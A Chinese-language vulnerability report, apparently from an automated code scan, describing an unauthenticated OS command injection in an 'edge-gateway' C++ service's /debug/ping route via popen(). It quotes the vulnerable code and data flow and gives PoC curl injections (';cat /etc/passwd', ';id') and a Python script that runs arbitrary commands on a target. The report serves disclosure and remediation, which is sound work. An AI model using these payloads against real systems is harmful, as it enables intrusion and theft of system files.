# VULN-DF-MAIN-001: /debug/ping 路由未过滤用户输入，通过 popen() 执行任意系统命令

> **简述长度**: 30字，概括漏洞本质

**严重性**: Critical | **CWE**: CWE-78 (OS Command Injection) | **置信度**: 85/100
**位置**: `src/main.cpp:64-68` @ `lambda(POST /debug/ping)`

---

## 1. 漏洞细节

该漏洞存在于 edge-gateway 应用的 `/debug/ping` HTTP 路由中。该路由接收用户通过 HTTP 查询参数传入的 `host` 值，未经任何输入验证或清洗，直接传递给 `Diagnostics::pingHost()` 函数。`pingHost()` 内部通过简单的字符串拼接构造 shell 命令（`"ping -c 1 " + host`），然后调用 `popen()` 执行。

`popen()` 函数会调用 `/bin/sh -c` 来执行传入的命令字符串，这意味着所有 shell 元字符（如 `;`、`|`、`&&`、`$()`、反引号等）都会被 shell 解释执行。攻击者可以通过在 `host` 参数中注入 shell 元字符，在服务器上执行任意操作系统命令。

**漏洞根因**：
1. HTTP 路由层（`main.cpp:64-68`）未对 `host` 参数进行任何校验或清洗
2. `queryValue()` 函数（`main.cpp:13-16`）仅做 map 查找，不含安全逻辑
3. `pingHost()` 函数（`diagnostics.cpp:7-22`）使用字符串拼接构造命令，未做 shell 转义
4. HTTP 服务器无任何认证中间件，`/debug/ping` 路由对所有人开放
5. 整个数据流路径中不存在任何安全缓解措施

## 2. 漏洞代码

### 入口点 — HTTP 路由处理器

**文件**: `src/main.cpp` (行 64-68)

```cpp
server.route("POST", "/debug/ping", [&](const HttpRequest& request) {
    std::string host = queryValue(request, "host");  // ← 污点源：用户可控的查询参数
    audit.event("operator", "debug-ping", host);
    return text(200, diagnostics.pingHost(host));     // ← 污点传递至 Diagnostics 模块
});
```

### 参数提取函数

**文件**: `src/main.cpp` (行 13-16)

```cpp
std::string queryValue(const HttpRequest& request, const std::string& key) {
  auto found = request.query.find(key);
  return found == request.query.end() ? "" : found->second;  // ← 直接返回原始值，无清洗
}
```

### 漏洞触发点 — 命令构造与执行

**文件**: `src/diagnostics.cpp` (行 7-22)

```cpp
std::string Diagnostics::pingHost(const std::string& host) const {
  std::string command = "ping -c 1 " + host;     // ← 危险：字符串拼接，无转义
  std::array<char, 256> buffer {};
  std::ostringstream output;

  FILE* pipe = popen(command.c_str(), "r");       // ← SINK：shell 执行，元字符被解释
  if (!pipe) {
    return "failed to start diagnostic command\n";
  }

  while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
    output << buffer.data();
  }
  pclose(pipe);
  return output.str();
}
```

**逐段分析**：
- `main.cpp:65`：`queryValue()` 从 HTTP 请求的查询参数中提取 `host` 值，该值完全由攻击者控制
- `main.cpp:67`：提取的 `host` 值直接传递给 `diagnostics.pingHost()`，中间无任何校验
- `diagnostics.cpp:8`：`"ping -c 1 " + host` 进行简单字符串拼接，如果 `host` 包含 `;cat /etc/passwd`，则最终命令变为 `ping -c 1 ;cat /etc/passwd`
- `diagnostics.cpp:12`：`popen()` 通过 `/bin/sh -c` 执行命令，shell 会解析并执行注入的额外命令

## 3. 完整攻击链路

```
[入口点] POST /debug/ping@src/main.cpp:64
↓ HTTP 请求到达，HttpServer::run() 解析请求并分发至处理器（无认证检查）
[参数提取] queryValue(request, "host")@src/main.cpp:65
↓ 从 request.query map 中直接取出用户提供的 host 值，无任何清洗
[污点传递] diagnostics.pingHost(host)@src/main.cpp:67
↓ host 字符串原样传入 Diagnostics 模块
[命令构造] "ping -c 1 " + host@src/diagnostics.cpp:8
↓ 字符串拼接生成完整命令，注入的 shell 元字符成为命令的一部分
[漏洞触发] popen(command.c_str(), "r")@src/diagnostics.cpp:12
↓ /bin/sh -c 执行拼接后的命令，shell 元字符被解释，任意命令被执行
[结果回传] output.str() → text(200, ...)@src/main.cpp:67
↓ 命令执行结果通过 HTTP 响应返回给攻击者
```

**攻击链路详细说明**：

1. **请求接收**（`http_server.cpp:105-133`）：`HttpServer::run()` 通过 TCP socket 接收原始 HTTP 请求，调用 `parseRequest()` 解析，然后根据 method+path 查找对应处理器。**整个过程中无任何认证或授权检查**。

2. **参数提取**（`main.cpp:65`）：`queryValue()` 函数从已解析的 `request.query` map 中查找 `host` 键。`parseQuery()`（`http_server.cpp:19-32`）仅按 `&` 和 `=` 分割查询字符串，不做 URL 解码以外的任何处理。

3. **命令构造**（`diagnostics.cpp:8`）：用户输入直接与 `"ping -c 1 "` 拼接。无任何 allowlist 校验、正则匹配、shell 转义。

4. **命令执行**（`diagnostics.cpp:12`）：`popen()` 内部调用 `fork()` + `execl("/bin/sh", "sh", "-c", command, NULL)`，shell 会完整解析命令字符串中的所有元字符。

5. **结果返回**（`diagnostics.cpp:17-21`, `main.cpp:67`）：命令执行的 stdout 输出被捕获并通过 HTTP 200 响应返回给客户端，攻击者可直接获取执行结果。

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。任何能够访问 edge-gateway 服务端口（默认 8080）的网络攻击者均可发起攻击，无需任何凭据或会话令牌。

**攻击向量**: 通过 HTTP POST 请求向 `/debug/ping` 端点发送包含恶意 `host` 查询参数的请求。

**利用难度**: 低

### 攻击步骤

1. **侦察**: 攻击者发现目标主机运行 edge-gateway 服务（端口 8080），并识别出 `/debug/ping` 端点
2. **构造恶意请求**: 在 `host` 查询参数中注入 shell 元字符和任意命令
3. **发送请求**: 向 `POST /debug/ping?host=<恶意payload>` 发送 HTTP 请求
4. **获取结果**: 服务器执行注入的命令，并将 stdout 输出通过 HTTP 响应返回
5. **升级利用**: 根据初始命令执行结果，攻击者可进一步下载敏感数据、建立反向 shell、横向移动

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需能访问 edge-gateway 的监听端口（默认 8080），无防火墙限制    |
| 认证要求   | 无需认证       | `/debug/ping` 路由无任何认证检查，HTTP 服务器无认证中间件            |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，服务启动即可利用                           |
| 环境依赖   | 需要 /bin/sh   | `popen()` 依赖 `/bin/sh` 执行命令，标准 Linux 环境均满足             |
| 时序条件   | 无时序依赖     | 直接同步执行，无竞态条件要求                                         |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                       |
| -------- | ---- | ------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 攻击者可读取服务器上的任意文件（如 `/etc/passwd`、应用配置、密钥等），命令输出直接返回     |
| 完整性   | 高   | 攻击者可修改服务器上的文件、安装后门、篡改数据（通过 `wget`/`curl` 下载恶意文件或 `echo >` 写入） |
| 可用性   | 高   | 攻击者可终止服务进程（`kill`）、删除关键文件、或消耗系统资源导致拒绝服务                   |

**影响范围**: 全局影响。命令以运行 edge-gateway 进程的用户权限执行。如果服务以 root 权限运行，攻击者可获得完整的系统控制权。即使以普通用户运行，也可读取该用户可访问的所有数据，并可能通过权限提升进一步扩大影响。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 读取 /etc/passwd

```bash
# 使用 curl 发送恶意请求，注入 cat /etc/passwd 命令
curl -X POST "http://TARGET:8080/debug/ping?host=;cat%20/etc/passwd"
```

**预期结果**: HTTP 响应体中包含 `/etc/passwd` 文件内容

### PoC 2: 命令执行验证（带外确认）

```bash
# 使用反引号注入 whoami 命令
curl -X POST "http://TARGET:8080/debug/ping?host=;whoami"
```

**预期结果**: HTTP 响应体中返回当前运行进程的用户名

### PoC 3: Python 自动化利用脚本

```python
#!/usr/bin/env python3
"""
PoC: VULN-DF-MAIN-001 命令注入漏洞利用
仅供安全测试和授权渗透测试使用
"""
import requests
import sys
import urllib.parse

def exploit(target, command):
    """通过 /debug/ping 路由执行任意系统命令"""
    url = f"http://{target}:8080/debug/ping"
    # 使用分号分隔，使命令在 ping 之后执行
    payload = f";{command}"
    params = {"host": payload}
    
    try:
        response = requests.post(url, params=params, timeout=10)
        print(f"[*] 状态码: {response.status_code}")
        print(f"[*] 命令输出:\n{response.text}")
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] 请求失败: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <目标IP> <命令>")
        print(f"示例: {sys.argv[0]} 192.168.1.100 'cat /etc/passwd'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    exploit(target, command)
```

**使用说明**:
1. 确保目标 edge-gateway 服务正在运行（默认端口 8080）
2. 执行 `python3 poc.py <目标IP> 'id'` 验证命令执行
3. 观察返回的 HTTP 响应中是否包含命令执行结果

**预期结果**: 注入的命令被执行，stdout 输出通过 HTTP 响应体返回给攻击者

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / 任何支持 socket 编程的 Linux 发行版)
- 编译器: GCC 9+ 或 Clang 10+（支持 C++17）
- 依赖: 标准 C++ 库、POSIX socket API、`/bin/sh`（默认存在）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 使用 CMake 构建（如果项目有 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或直接编译
g++ -std=c++17 -I include -o edge-gateway src/main.cpp src/http_server.cpp src/diagnostics.cpp src/file_cache.cpp src/user_store.cpp src/audit_log.cpp
```

### 运行配置

```bash
# 启动服务（默认监听 8080 端口）
./edge-gateway 8080

# 确认服务已启动
curl http://localhost:8080/health
# 预期输出: ok
```

### 验证步骤

1. 启动 edge-gateway 服务
2. 发送正常请求验证功能：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=127.0.0.1"
   ```
   预期：返回 ping 命令的输出
3. 发送注入请求验证漏洞：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;id"
   ```
   预期：返回 `uid=xxx(...)` 格式的 id 命令输出
4. 进一步验证 — 读取敏感文件：
   ```bash
   curl -X POST "http://localhost:8080/debug/ping?host=;cat%20/etc/hostname"
   ```
   预期：返回主机名

### 预期结果

- 正常请求：返回 `ping -c 1 127.0.0.1` 的标准输出
- 注入请求（`;id`）：返回类似 `uid=1000(user) gid=1000(user) groups=1000(user)` 的输出，证明任意命令执行成功
- 注入请求（`;cat /etc/hostname`）：返回系统主机名，证明文件读取成功
- 攻击者注入的命令与 `ping` 命令以相同权限执行，输出通过 HTTP 响应完整返回
